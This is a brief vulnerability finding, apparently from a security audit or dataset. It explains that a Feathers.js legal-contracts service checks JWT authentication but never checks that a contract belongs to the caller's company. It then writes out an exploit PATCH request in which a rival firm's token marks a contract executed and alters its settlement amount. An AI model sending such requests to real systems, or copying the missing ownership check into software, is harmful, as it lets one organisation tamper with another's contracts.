diagnosis: The Feathers.js legal-contracts service configures JWT authentication and timestamp updates in its before hooks, but does not implement an authorization hook to verify that the contract record identified by context.id belongs to context.params.user.companyId, allowing any authenticated company to alter contracts of other firms.
exploit_request:
PATCH /legal-contracts/ctr_904128 HTTP/1.1
Host: legalops.corp.internal:3030
Authorization: Bearer <rival_firm_jwt>
Content-Type: application/json

{"status": "EXECUTED", "settlementAmount": 500}
